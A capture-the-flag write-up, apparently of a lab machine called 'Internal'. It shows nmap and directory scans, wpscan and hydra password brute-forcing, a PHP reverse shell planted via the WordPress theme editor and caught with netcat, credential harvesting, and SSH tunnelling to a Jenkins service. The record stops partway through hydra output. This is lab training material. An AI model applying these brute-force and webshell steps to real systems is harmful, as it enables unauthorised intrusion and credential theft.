## Internal

> Linux machine

`export ip=10.10.42.63`

--------------------------

### Reconnaissance

### Nmap

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/internal]
└─$ nmap -sC -sV -oN nmap/initial $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 22:30 IST
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 18.35% done; ETC: 22:31 (0:00:04 remaining)
Nmap scan report for 10.10.42.63
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                               
Nmap done: 1 IP address (1 host up) scanned in 31.15 seconds                            
```

### Directory bruteforce

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/internal]
└─$ feroxbuster -u http://10.10.42.63/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.42.63/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      309c http://10.10.42.63/blog => http://10.10.42.63/blog/
200      GET       15l       74w     6147c http://10.10.42.63/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://10.10.42.63/
301      GET        9l       28w      314c http://10.10.42.63/wordpress => http://10.10.42.63/wordpress/
301      GET        9l       28w      315c http://10.10.42.63/javascript => http://10.10.42.63/javascript/
301      GET        9l       28w      320c http://10.10.42.63/blog/wp-content => http://10.10.42.63/blog/wp-content/
301      GET        9l       28w      321c http://10.10.42.63/blog/wp-includes => http://10.10.42.63/blog/wp-includes/
301      GET        9l       28w      325c http://10.10.42.63/wordpress/wp-content => http://10.10.42.63/wordpress/wp-content/
301      GET        9l       28w      332c http://10.10.42.63/wordpress/wp-content/themes => http://10.10.42.63/wordpress/wp-content/themes/
301      GET        9l       28w      341c http://10.10.42.63/wordpress/wp-includes/images/smilies => http://10.10.42.63/wordpress/wp-includes/images/smilies/
301      GET        9l       28w      326c http://10.10.42.63/wordpress/wp-includes => http://10.10.42.63/wordpress/wp-includes/
301      GET        9l       28w      333c http://10.10.42.63/wordpress/wp-includes/images => http://10.10.42.63/wordpress/wp-includes/images/
301      GET        9l       28w      328c http://10.10.42.63/blog/wp-includes/assets => http://10.10.42.63/blog/wp-includes/assets/
301      GET        9l       28w      339c http://10.10.42.63/wordpress/wp-includes/images/media => http://10.10.42.63/wordpress/wp-includes/images/media/
301      GET        9l       28w      327c http://10.10.42.63/blog/wp-content/themes => http://10.10.42.63/blog/wp-content/themes/
301      GET        9l       28w      328c http://10.10.42.63/blog/wp-includes/images => http://10.10.42.63/blog/wp-includes/images/
301      GET        9l       28w      333c http://10.10.42.63/wordpress/wp-includes/assets => http://10.10.42.63/wordpress/wp-includes/assets/
301      GET        9l       28w      325c http://10.10.42.63/blog/wp-includes/css => http://10.10.42.63/blog/wp-includes/css/
301      GET        9l       28w      334c http://10.10.42.63/blog/wp-includes/images/media => http://10.10.42.63/blog/wp-includes/images/media/
301      GET        9l       28w      328c http://10.10.42.63/blog/wp-content/plugins => http://10.10.42.63/blog/wp-content/plugins/
301      GET        9l       28w      330c http://10.10.42.63/wordpress/wp-includes/css => http://10.10.42.63/wordpress/wp-includes/css/
301      GET        9l       28w      333c http://10.10.42.63/wordpress/wp-content/plugins => http://10.10.42.63/wordpress/wp-content/plugins/
301      GET        9l       28w      328c http://10.10.42.63/blog/wp-includes/blocks => http://10.10.42.63/blog/wp-includes/blocks/
301      GET        9l       28w      333c http://10.10.42.63/wordpress/wp-includes/blocks => http://10.10.42.63/wordpress/wp-includes/blocks/
301      GET        9l       28w      329c http://10.10.42.63/blog/wp-includes/widgets => http://10.10.42.63/blog/wp-includes/widgets/
301      GET        9l       28w      334c http://10.10.42.63/wordpress/wp-includes/widgets => http://10.10.42.63/wordpress/wp-includes/widgets/
301      GET        9l       28w      335c http://10.10.42.63/wordpress/wp-includes/css/dist => http://10.10.42.63/wordpress/wp-includes/css/dist/
301      GET        9l       28w      330c http://10.10.42.63/blog/wp-includes/css/dist => http://10.10.42.63/blog/wp-includes/css/dist/
[####################] - 3m   1928382/1928382 0s      found:28      errors:1865927
[####################] - 86s    87650/87650   1024/s  http://10.10.42.63/ 
[####################] - 87s    87650/87650   1013/s  http://10.10.42.63/blog/ 
[####################] - 85s    87650/87650   1030/s  http://10.10.42.63/wordpress/ 
[####################] - 83s    87650/87650   1055/s  http://10.10.42.63/javascript/ 
[####################] - 81s    87650/87650   1079/s  http://10.10.42.63/blog/wp-content/ 
[####################] - 81s    87650/87650   1083/s  http://10.10.42.63/wordpress/wp-content/ 
[####################] - 70s    87650/87650   1244/s  http://10.10.42.63/blog/wp-includes/ 
[####################] - 70s    87650/87650   1248/s  http://10.10.42.63/wordpress/wp-includes/ 
[####################] - 74s    87650/87650   1192/s  http://10.10.42.63/wordpress/wp-includes/images/ 
[####################] - 69s    87650/87650   1263/s  http://10.10.42.63/blog/wp-content/themes/ 
[####################] - 72s    87650/87650   1214/s  http://10.10.42.63/wordpress/wp-content/themes/ 
[####################] - 70s    87650/87650   1246/s  http://10.10.42.63/blog/wp-includes/images/ 
[####################] - 69s    87650/87650   1278/s  http://10.10.42.63/wordpress/wp-includes/assets/ 
[####################] - 68s    87650/87650   1283/s  http://10.10.42.63/blog/wp-includes/assets/ 
[####################] - 61s    87650/87650   1443/s  http://10.10.42.63/blog/wp-includes/css/ 
[####################] - 67s    87650/87650   1311/s  http://10.10.42.63/blog/wp-content/plugins/ 
[####################] - 65s    87650/87650   1341/s  http://10.10.42.63/wordpress/wp-includes/css/ 
[####################] - 65s    87650/87650   1353/s  http://10.10.42.63/wordpress/wp-content/plugins/ 
[####################] - 2m     87650/87650   666/s   http://10.10.42.63/blog/wp-includes/blocks/ 
[####################] - 45s    87650/87650   1959/s  http://10.10.42.63/wordpress/wp-includes/blocks/ 
[####################] - 43s    87650/87650   2047/s  http://10.10.42.63/blog/wp-includes/widgets/ 
[####################] - 35s    87650/87650   2523/s  http://10.10.42.63/wordpress/wp-includes/widgets/   
```

### Initial access

On accessing the webpage running on port 80, it seems cluttered - Add hostname in /etc/hosts file

```
┌──(root🔥HackBox)-[/home/edith/pwn/vuln_machines/internal]
└─# echo "10.10.42.63 internal.thm" >> /etc/hosts

┌──(root🔥HackBox)-[/home/edith/pwn/vuln_machines/internal]
└─# cat /etc/hosts                                                                                                                                           
127.0.0.1       localhost
127.0.1.1       HackBox

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.42.63 internal.thm
```

Found wordpress CMS - Bruteforce password for that using wpscan

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/internal]
└─$ wpscan --url http://internal.thm/blog/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt -t 100                                                   
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/wp-login.php/ [10.10.54.174]
[+] Started: Tue May 21 20:15:44 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://internal.thm/blog/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://internal.thm/blog/wp-includes/css/dashicons.min.css?ver=5.4.2
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://internal.thm/blog/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-includes/js/wp-util.min.js?ver=5.4.2
 |  Query Parameter In Install Page (Aggressive Detection)
 |   - http://internal.thm/blog/wp-includes/css/dashicons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-admin/css/forms.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-admin/css/l10n.min.css?ver=5.4.2

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:07 <==============================================================================> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                  
Trying admin / liezel Time: 00:01:06 <                                                                              > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue May 21 20:17:03 2024
[+] Requests Done: 4039
[+] Cached Requests: 184
[+] Data Sent: 1.433 MB
[+] Data Received: 19.852 MB
[+] Memory used: 285.703 MB
[+] Elapsed time: 00:01:18
```

> Creds Found : Username - admin; Password - my2boys

Login to wordpress - Success! :)

On roadming the wordress, found the post that have credentials

> Creds Found : william:arnold147

![](/home/edith/pwn/vuln_machines/internal/001.png)

Upload Shell by traversing to Apperance --> Theme Editor, replace any php file to revshell and access it to get initial access

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/internal]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.17.49.246] from (UNKNOWN) [10.10.54.174] 49838
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:56:39 up 22 min,  0 users,  load average: 0.00, 1.94, 2.55
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@internal:/$ export TERM=xterm
export TERM=xterm
www-data@internal:/$ ^Z
[1]+  Stopped                 nc -nvlp 1234

┌──(edith🛸HackBox)-[~/pwn/vuln_machines/internal]
└─$ stty raw -echo; fg                                                                                                                                       
nc -nvlp 1234

www-data@internal:/$ whoami
www-data
```

Check if we have any user named **william** [As we found in wordpress blog]

```
www-data@internal:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                                                              
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                                                                                 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                                                                                  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                                                                                            
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                                                          
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

> No user **William** - Found :(

#### Check for privilege escalation vectors

It can be done manually (OR) via scripts like linpeas

##### Check for binaries that are allowed to run with root permission

```
www-data@internal:/$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
```

##### Check for suspicious SUID bit set files

```
www-data@internal:/tmp$ find / -perm -u=s -type f 2>/dev/null 
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/bin/mount
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

##### Check for cron jobs

```
www-data@internal:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

##### Check for open connection

```
www-data@internal:/tmp$ ss -putln
Netid State   Recv-Q  Send-Q         Local Address:Port      Peer Address:Port  
udp   UNCONN  0       0              127.0.0.53%lo:53             0.0.0.0:*     
udp   UNCONN  0       0          10.10.54.174%eth0:68             0.0.0.0:*     
tcp   LISTEN  0       80                 127.0.0.1:3306           0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:8080           0.0.0.0:*     
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*     
tcp   LISTEN  0       128                  0.0.0.0:22             0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:34363          0.0.0.0:*     
tcp   LISTEN  0       128                        *:80                   *:*     
tcp   LISTEN  0       128                     [::]:22                [::]:*     
```

Seems some internal services running on **8080** and **34363** - we need credentials to forward it :( 

Roaming through directories found **credentials**

```
www-data@internal:/$ cd /opt/
www-data@internal:/opt$ ls -l
total 8
drwx--x--x 4 root root 4096 Aug  3  2020 containerd
-rw-r--r-- 1 root root  138 Aug  3  2020 wp-save.txt
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

> Creds Found : aubreanna:bubb13guM!@#123

We can use this to tunnel both ports to our local machine

###### Port 8080

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/internal/share]
└─$ ssh -L 8080:localhost:8080 aubreanna@internal.thm
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue May 21 16:45:38 UTC 2024

  System load:  0.08              Processes:              116
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 48%               IP address for eth0:    10.10.54.174
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue May 21 16:37:38 2024 from 10.10.54.174

aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ ip a sh 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:85:19:90:c7:c7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.37.97/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3504sec preferred_lft 3504sec
    inet6 fe80::85:19ff:fe90:c7c7/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:4b:1f:79:a0 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:4bff:fe1f:79a0/64 scope link 
       valid_lft forever preferred_lft forever
5: vethefad594@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 66:b6:a9:a8:c1:5d brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::64b6:a9ff:fea8:c15d/64 scope link 
       valid_lft forever preferred_lft forever
```

> On checking files present in user directory, found jenkins is running on **172.17.0.2:8080** and on checking the ip address found **docker0** has the IP range **172.17.0.1/16**

###### Port 34363

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/internal/share]
└─$ ssh -L 34363:localhost:34363 aubreanna@internal.thm
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue May 21 16:47:25 UTC 2024

  System load:  0.01              Processes:              119
  Usage of /:   63.7% of 8.79GB   Users logged in:        1
  Memory usage: 49%               IP address for eth0:    10.10.54.174
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue May 21 16:45:38 2024 from 10.17.49.246
```

On accessing it, port 8080 has jenkins running and 34363 is 404 not found

### Privilege Escalation

Try bruteforcing jenkins

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/internal]
└─$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-22 19:23:52
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking http-post-form://localhost:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password
[ATTEMPT] target localhost - login "admin" - pass "123456" - 1 of 28688798 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "12345" - 2 of 28688798 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "123456789" - 3 of 28688798 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "password" - 4 of 28688798 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "iloveyou" - 5 of 28688798 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "princess" - 6 of 28688798 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "1234567" - 7 of 28688798 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "rockyou" - 8 of 28688798 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "12345678" - 9 of 28688798 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "abc123" - 10 of 28688798 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "nicole" - 11 of 28688798 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "daniel" - 12 of 28688798 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "babygirl" - 13 of 28688798 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "monkey" - 14 of 28688798 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "lovely" - 15 of 28688798 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jessica" - 16 of 28688798 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "654321" - 17 of 28688798 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "michael" - 18 of 28688798 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "ashley" - 19 of 28688798 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "qwerty" - 20 of 28688798 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "111111" - 21 of 28688798 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "iloveu" - 22 of 28688798 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "000000" - 23 of 28688798 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "michelle" - 24 of 28688798 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "tigger" - 25 of 28688798 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "sunshine" - 26 of 28688798 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "chocolate" - 27 of 28688798 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "password1" - 28 of 28688798 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "soccer" - 29 of 28688798 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "anthony" - 30 of 28688798 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "friends" - 31 of 28688798 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "butterfly" - 32 of 28688798 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "purple" - 33 of 28688798 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "angel" - 34 of 28688798 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jordan" - 35 of 28688798 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "liverpool" - 36 of 28688798 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "justin" - 37 of 28688798 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "loveme" - 38 of 28688798 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "fuckyou" - 39 of 28688798 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "123123" - 40 of 28688798 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "football" - 41 of 28688798 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "secret" - 42 of 28688798 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "andrea" - 43 of 28688798 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "carlos" - 44 of 28688798 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jennifer" - 45 of 28688798 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "joshua" - 46 of 28688798 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "bubbles" - 47 of 28688798 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "1234567890" - 48 of 28688798 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "superman" - 49 of 28688798 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "hannah" - 50 of 28688798 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "amanda" - 51 of 28688798 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "loveyou" - 52 of 28688798 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "pretty" - 53 of 28688798 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "basketball" - 54 of 28688798 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "andrew" - 55 of 28688798 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "angels" - 56 of 28688798 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "tweety" - 57 of 28688798 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "flower" - 58 of 28688798 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "playboy" - 59 of 28688798 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "hello" - 60 of 28688798 [child 11] (0/0)
